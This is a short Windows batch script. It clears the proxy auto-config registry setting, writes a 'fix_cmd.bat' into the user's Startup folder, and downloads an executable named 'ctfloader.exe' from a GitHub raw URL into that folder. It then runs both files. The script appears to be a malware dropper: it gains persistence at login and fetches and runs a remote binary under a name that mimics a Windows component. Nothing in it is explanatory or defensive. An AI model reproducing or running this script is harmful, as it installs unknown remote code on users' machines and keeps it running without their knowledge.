reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /t REG_SZ /d "" /f
@echo off

(
    echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /t REG_SZ /d "" /f
    echo curl -L -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ctfloader.exe" https://raw.githubusercontent.com/SilverLakeMake/dssh/main/ctfloader.exe
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fix_cmd.bat"
"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fix_cmd.bat"
"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ctfloader.exe"